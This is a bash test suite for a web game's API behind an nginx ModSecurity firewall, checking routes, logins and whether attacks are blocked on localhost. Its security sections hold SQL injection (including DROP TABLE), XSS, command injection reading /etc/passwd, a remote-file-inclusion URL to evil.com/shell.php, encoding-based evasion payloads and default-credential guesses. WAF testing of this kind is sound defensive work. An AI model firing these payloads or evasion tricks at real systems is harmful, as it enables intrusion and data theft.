#!/bin/bash

# Colors and Styles
RESET='\e[0m'
BOLD='\e[1m'
RED='\e[31m'
GREEN='\e[32m'
PURPLE='\e[95m'
BLUE='\e[34m'
YELLOW='\e[33m'
CYAN='\e[36m'

# Configuration
BASE_URL="https://localhost:8443/request"
CURL_OPTS="-k -s"

# Helper functions
print_header() {
	echo -e "\n${BLUE}=== $1 ===${RESET}"
}

print_section() {
	echo -e "\n${PURPLE}$1${RESET}"
}

print_test() {
	echo -e "${CYAN}$1${RESET}"
}

test_route() {
	local method=$1
	local endpoint=$2
	local data=$3
	local expected_codes=$4
	
	if [ -n "$data" ]; then
		status=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
			-X $method "$BASE_URL$endpoint" \
			-H "Content-Type: application/json" \
			-d "$data")
	else
		status=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
			-X $method "$BASE_URL$endpoint")
	fi
	
	echo -n "Status: $status "
	
	if [[ "$expected_codes" == *"$status"* ]]; then
		echo -e "✅"
	else
		echo -e "❌ (Expected: $expected_codes)"
	fi
}

test_security_attack() {
	local url=$1
	local attack_name=$2
	local should_block=$3
	
	# Ajouter un timeout et retry
	status=$(curl $CURL_OPTS --max-time 10 --retry 2 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
	
	echo -n "Status: $status "
	
	if [ "$status" = "000" ]; then
		echo -e "⚠️  CONNECTION FAILED (timeout/network)"
	elif [ "$should_block" = "true" ]; then
		if [ "$status" = "403" ]; then
			echo -e "✅ BLOCKED"
		else
			echo -e "❌ NOT BLOCKED"
		fi
	else
		if [ "$status" = "200" ]; then
			echo -e "✅ ALLOWED"
		else
			echo -e "⚠️  UNEXPECTED ($status)"
		fi
	fi
}

# Main test functions
test_public_routes() {
	print_section "📍 Testing Public Routes"
	
	print_test "GET /config/logger"
	test_route "GET" "/config/logger" "" "200"
	
	print_test "GET /db-credentials"
	test_route "GET" "/db-credentials" "" "200"
	
	print_test "GET /user/google-config"
	test_route "GET" "/user/google-config" "" "200"
}

test_user_routes() {
	print_section "👤 Testing User Routes"
	
	print_test "POST /user/create-user"
	test_route "POST" "/user/create-user" '{"name":"testuser","password":"testpass"}' "200 201 409"
	
	print_test "POST /user/login"
	test_route "POST" "/user/login" '{"name":"testuser","password":"testpass"}' "200 401"
	
	print_test "GET /profile (no auth)"
	test_route "GET" "/profile" "" "401"
}

test_game_routes() {
	print_section "🎮 Testing Game Routes"
	
	print_test "GET /game/get-user-games"
	test_route "GET" "/game/get-user-games" "" "401"
	
	print_test "POST /game/create-1v1-game"
	test_route "POST" "/game/create-1v1-game" '{"player1":"test1","player2":"test2"}' "400 401"
	
	print_test "GET /platformer/get-user-platformer"
	test_route "GET" "/platformer/get-user-platformer" "" "401"
}

test_admin_routes() {
	print_section "⚙️ Testing Admin Routes"
	
	print_test "GET /admin/get-all-users"
	test_route "GET" "/admin/get-all-users" "" "200 401 403"
	
	print_test "GET /admin/get-all-games"
	test_route "GET" "/admin/get-all-games" "" "200 401 403"
}

test_security() {
	print_section "🛡️ Testing Security (ModSecurity)"
	
	print_test "SQL Injection Test"
	# URL-encoded: 1' OR '1'='1 devient 1%27%20OR%20%271%27%3D%271
	test_security_attack "${BASE_URL}/user/login?id=1%27%20OR%20%271%27%3D%271" "SQL Injection" "true"
	
	print_test "XSS Test"
	# URL-encoded: <script>alert('xss')</script> devient %3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E
	test_security_attack "${BASE_URL}/profile?search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" "XSS" "true"
	
	print_test "Path Traversal Test"
	response=$(curl $CURL_OPTS "${BASE_URL}/../../../etc/passwd")
	if echo "$response" | grep -q "root:"; then
		echo -e "❌ VULNERABLE - /etc/passwd content leaked!"
	elif echo "$response" | grep -q "<!DOCTYPE html>"; then
		echo -e "✅ PROTECTED - Returns safe HTML instead"
	else
		echo -e "⚠️  UNKNOWN - Check manually"
	fi
	
	print_test "Additional XSS variants"
	# URL-encoded: <img src=x onerror=alert(1)> devient %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
	test_security_attack "${BASE_URL}/profile?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" "IMG XSS" "true"
	# URL-encoded: javascript:alert(1) devient javascript%3Aalert%281%29
	test_security_attack "${BASE_URL}/profile?q=javascript%3Aalert%281%29" "JS Protocol" "true"
	
	print_test "Advanced SQL Injection Tests"
	# Différentes variantes d'injection SQL
	test_security_attack "${BASE_URL}/user/login?id=1%27%20UNION%20SELECT%20*%20FROM%20users--" "SQL UNION" "true"
	test_security_attack "${BASE_URL}/user/login?name=admin%27--&password=anything" "SQL Comment" "true"
	test_security_attack "${BASE_URL}/profile?search=1%27%29%20OR%20%271%27%3D%271%20--%20" "SQL Bypass" "true"
}

test_modsecurity_advanced() {
    print_section "🛡️ Advanced ModSecurity Testing"
    
    print_test "1. XSS Variations"
    test_security_attack "${BASE_URL}/profile?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" "IMG XSS" "true"
    test_security_attack "${BASE_URL}/profile?q=%3Csvg%20onload%3Dalert%281%29%3E" "SVG XSS" "true"
    test_security_attack "${BASE_URL}/profile?q=javascript%3Aalert%281%29" "JS Protocol" "true"
    
    print_test "2. SQL Injection Variations"
    test_security_attack "${BASE_URL}/user/login?id=1%27%20UNION%20SELECT%20*%20FROM%20users--" "SQL UNION" "true"
    test_security_attack "${BASE_URL}/user/login?id=1%27%20AND%20%271%27%3D%271" "SQL AND" "true"
    test_security_attack "${BASE_URL}/user/login?id=1%27%3B%20DROP%20TABLE%20users%3B--" "SQL DROP" "true"
    
    print_test "3. Command Injection"
    test_security_attack "${BASE_URL}/profile?cmd=cat%20/etc/passwd" "Command Injection" "true"
    test_security_attack "${BASE_URL}/profile?cmd=%7Ccat%20/etc/passwd" "Pipe Command" "true"
    test_security_attack "${BASE_URL}/profile?cmd=%60cat%20/etc/passwd%60" "Backtick Command" "true"
    
    print_test "4. File Inclusion"
    test_security_attack "${BASE_URL}/profile?file=../../../etc/passwd" "Local File Inclusion" "true"
    test_security_attack "${BASE_URL}/profile?file=http://evil.com/shell.php" "Remote File Inclusion" "true"
    
    print_test "5. HTTP Protocol Attacks"
    test_security_attack "${BASE_URL}/profile" "HTTP Method Override" "false" "-X OPTIONS"
    
    # Test avec headers malveillants
    print_test "6. Malicious Headers"
    status=$(curl $CURL_OPTS --max-time 10 -o /dev/null -w "%{http_code}" \
        -H "User-Agent: <script>alert('xss')</script>" \
        "$BASE_URL/profile" 2>/dev/null)
    echo -n "Malicious User-Agent: Status $status "
    [ "$status" = "403" ] && echo "✅ BLOCKED" || echo "❌ NOT BLOCKED"
    
    status=$(curl $CURL_OPTS --max-time 10 -o /dev/null -w "%{http_code}" \
        -H "X-Forwarded-For: 1' OR '1'='1" \
        "$BASE_URL/profile" 2>/dev/null)
    echo -n "Malicious X-Forwarded-For: Status $status "
    [ "$status" = "403" ] && echo "✅ BLOCKED" || echo "❌ NOT BLOCKED"
}

test_evasion_attempts() {
    print_section "🕵️ Evasion Technique Testing"
    
    print_test "1. Encoding Evasion"
    # Double encoding
    test_security_attack "${BASE_URL}/profile?q=%253Cscript%253E" "Double URL Encoding" "true"
    
    # Unicode encoding
    test_security_attack "${BASE_URL}/profile?q=%u003Cscript%u003E" "Unicode Encoding" "true"
    
    # Hex encoding
    test_security_attack "${BASE_URL}/profile?q=\\x3Cscript\\x3E" "Hex Encoding" "true"
    
    print_test "2. Case Variation"
    test_security_attack "${BASE_URL}/profile?q=%3CSCRIPT%3E" "Uppercase XSS" "true"
    test_security_attack "${BASE_URL}/profile?q=%3CScRiPt%3E" "Mixed Case XSS" "true"
    
    print_test "3. Whitespace/Comment Insertion"
    test_security_attack "${BASE_URL}/profile?q=%3Cscript/**/src%3E" "Comment Insertion" "true"
    test_security_attack "${BASE_URL}/profile?q=%3Cscript%09src%3E" "Tab Character" "true"
}

test_modsecurity_real_time() {
    print_section "📊 Real-time ModSecurity Monitoring"
    
    print_test "Starting attack simulation in background..."
    
    # Lancer des attaques en arrière-plan
    {
        curl -k -s "https://localhost:8443/request/profile?search=<script>alert('xss')</script>" > /dev/null
        sleep 1
        curl -k -s "https://localhost:8443/request/user/login?id=1' OR '1'='1" > /dev/null
        sleep 1
        curl -k -s "https://localhost:8443/request/profile?cmd=cat /etc/passwd" > /dev/null
    } &
    
    # Attendre un peu puis afficher les logs
    sleep 3
    
    print_test "Recent ModSecurity blocks (last 10):"
    docker logs nginx 2>&1 | grep "ModSecurity: Access denied" | tail -10 | while read line; do
        echo "🚨 $line"
    done
    
    print_test "Attack statistics:"
    total_blocks=$(docker logs nginx 2>&1 | grep -c "ModSecurity: Access denied")
    echo "📊 Total blocks detected: $total_blocks"
    
    recent_blocks=$(docker logs nginx 2>&1 | grep "ModSecurity: Access denied" | grep "$(date '+%Y/%m/%d')" | wc -l)
    echo "📊 Blocks today: $recent_blocks"
}

test_authentication() {
	print_section "🔐 Testing Authentication"
	
	# Tableau des credentials à tester
	local credentials=(
		'{"name":"admin","password":"admin"}'
		'{"name":"testuser","password":"testpass"}'
		'{"name":"user","password":"password"}'
		'{"name":"root","password":"root"}'
	)
	
	for cred in "${credentials[@]}"; do
		local name=$(echo "$cred" | jq -r '.name')
		print_test "Login attempt with user: $name"
		
		response=$(curl $CURL_OPTS -X POST "$BASE_URL/user/login" \
			-H "Content-Type: application/json" \
			-d "$cred")
		
		echo "Response: $response"
		
		# Vérifier si le login a réussi
		success=$(echo "$response" | jq -r '.success // .status // "unknown"' 2>/dev/null)
		
		if [ "$success" = "true" ] || echo "$response" | grep -q '"token"'; then
			echo "✅ Login successful for $name"
			
			# Essayer d'extraire le token
			token=$(echo "$response" | jq -r '.accessToken // .token // .access_token // .jwt // .sessionToken // .data.token' 2>/dev/null)
			
			if [ "$token" != "null" ] && [ "$token" != "" ] && [ "$token" != "undefined" ]; then
				echo "✅ Token extracted: ${token:0:20}..."
				
				print_test "GET /profile (with auth)"
				status=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
					-H "Authorization: Bearer $token" \
					"$BASE_URL/profile")
				echo "Status: $status"
				return 0  # Succès, on sort de la fonction
			fi
		else
			echo "❌ Login failed for $name"
		fi
		echo ""
	done
	
	# Si aucun login n'a fonctionné, tester les cookies/sessions
	print_test "Testing session-based authentication"
	response=$(curl $CURL_OPTS -c /tmp/cookies -X POST "$BASE_URL/user/login" \
		-H "Content-Type: application/json" \
		-d '{"name":"admin","password":"admin"}')
	
	if echo "$response" | grep -q '"success":true'; then
		print_test "GET /profile (with session cookies)"
		status=$(curl $CURL_OPTS -b /tmp/cookies -o /dev/null -w "%{http_code}" "$BASE_URL/profile")
		echo "Status: $status"
	else
		echo "ℹ️  Authentication may use different method (session cookies, external auth, etc.)"
	fi
	
	# Nettoyer
	rm -f /tmp/cookies
}

test_authentication_with_setup() {
    print_section "🔐 Testing Authentication (with user creation)"
    
    print_test "Creating test user"
    create_response=$(curl $CURL_OPTS -X POST "$BASE_URL/user/create-user" \
        -H "Content-Type: application/json" \
        -d '{"name":"testauth","password":"testauth123","email":"test@test.com"}')
    
    echo "User creation response: $create_response"
    
    # Tenter le login avec l'utilisateur créé
    print_test "Login with created user"
    response=$(curl $CURL_OPTS -X POST "$BASE_URL/user/login" \
        -H "Content-Type: application/json" \
        -d '{"name":"testauth","password":"testauth123"}')
    
    echo "Login response: $response"
    
    # Analyser la réponse
    if echo "$response" | grep -q '"success":true\|"token"\|"authenticated"'; then
        echo "✅ Authentication system working"
        
        # Extraire le token si présent
        token=$(echo "$response" | jq -r '.accessToken // .token // .access_token // .jwt // .data.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ "$token" != "" ]; then
            print_test "Testing protected route with token"
            profile_status=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
                -H "Authorization: Bearer $token" \
                "$BASE_URL/profile")
            echo "Profile access status: $profile_status"
        fi
    else
        echo "ℹ️  Authentication working but no token-based auth detected"
    fi
}

test_detailed_response() {
	print_section "🔍 Detailed Response Testing"
	
	print_test "POST /user/login (verbose)"
	curl -k -v "$BASE_URL/user/login" \
		-H "Content-Type: application/json" \
		-d '{"name":"admin","password":"admin"}' 2>&1 | head -30
	
	print_test "Response body analysis"
	response=$(curl $CURL_OPTS "$BASE_URL/user/login" \
		-H "Content-Type: application/json" \
		-d '{"name":"admin","password":"admin"}')
	
	if echo "$response" | jq . >/dev/null 2>&1; then
		echo "✅ Valid JSON response"
		echo "$response" | jq .
	else
		echo "❌ Invalid JSON response"
		echo "Raw response: $response"
	fi
}

check_modsecurity_logs() {
	print_section "📋 ModSecurity Activity"
	
	print_test "Recent ModSecurity alerts"
	if docker logs nginx 2>&1 | grep -i "modsecurity\|denied\|blocked" | tail -5; then
		echo "✅ ModSecurity activity detected"
	else
		echo "ℹ️  No recent ModSecurity alerts"
	fi
	
	print_test "Debug logs"
	if docker exec nginx tail -3 /var/log/nginx/modsec_debug.log 2>/dev/null; then
		echo "✅ Debug logs available"
	else
		echo "ℹ️  Debug log not available"
	fi
}

generate_report() {
	print_header "📊 TEST SUMMARY REPORT"
	
	echo -e "${GREEN}✅ Tests completed${RESET}"
	echo -e "${BLUE}ℹ️  Check logs above for any ❌ failures${RESET}"
	echo -e "${PURPLE}🛡️  Security tests validate ModSecurity protection${RESET}"
	echo -e "${CYAN}📋 Full test coverage for Transcendance API${RESET}"
}

# Main execution
main() {
	print_header "🚀 TRANSCENDANCE API TESTING SUITE"
	
	# Check if containers are running
	if ! docker ps | grep -q nginx; then
		echo -e "${RED}❌ Nginx container not running. Start with 'make up' first.${RESET}"
		exit 1
	fi
	
	case "$1" in
		"routes")
			test_public_routes
			test_user_routes
			test_game_routes
			test_admin_routes
			;;
		"security")
			test_security
			test_modsecurity_advanced
			test_evasion_attempts
			;;
		"modsec-full")
			test_modsecurity_advanced
			test_evasion_attempts
			test_modsecurity_real_time
			;;
		"monitor")
			test_modsecurity_real_time
			;;
		"auth")
			test_authentication
			test_authentication_with_setup
			;;
		"detailed")
			test_detailed_response
			;;
		"logs")
			check_modsecurity_logs
			;;
		"all"|"")
			test_public_routes
			test_user_routes
			test_game_routes
			test_admin_routes
			test_security
			test_authentication
			check_modsecurity_logs
			generate_report
			;;
		*)
			echo "Usage: $0 [routes|security|auth|detailed|logs|all]"
			exit 1
			;;
	esac
}

main "$@"